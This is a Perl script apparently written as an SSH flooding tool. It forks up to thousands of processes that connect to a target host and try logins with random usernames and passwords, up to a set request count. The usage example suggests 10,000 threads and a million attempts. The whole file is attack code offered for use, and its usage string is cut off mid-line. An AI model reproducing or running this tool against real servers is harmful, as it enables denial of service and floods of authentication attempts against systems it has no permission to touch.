use Net::SSH::Perl;
use Parallel::ForkManager;

use vars qw( $PROG );
( $PROG = $0 ) =~ s/^.*[\/\\]//;
if ( @ARGV == 0 ) {
    print
"Usage: ./$PROG [TARGET] [THREADS] [MAXREQUESTS]\nExample: ./$PROG 1.1.1.1 10000 1000000\n**Requires Net::SSH::Perl**\nMade by Vyp$
    exit;
}
my $host          = $ARGV[0];
my $max_processes = $ARGV[1];
my $count         = 1;
my $max           = $ARGV[2];
my $pm            = Parallel::ForkManager->new($max_processes);
$| = 1;

while ( $count <= $max ) {
    my @chars = ( "a" .. "z", A .. Z, 0 .. 9 );
    my $user = join '', map { @chars[ rand @chars ] } 1 .. 8;
    my $pass = join '', map { @chars[ rand @chars ] } 1 .. 8;
    $count++;
    my $pid = $pm->start and next;
    my $ssh = Net::SSH::Perl->new($host);
    $ssh->login( $user, $pass );
    my ( $stdout, $stderr, $exit ) = $ssh->cmd($cmd);
    $pm->finish;
}
$pm->wait_all_children;
system("clear");
print "Done\n";
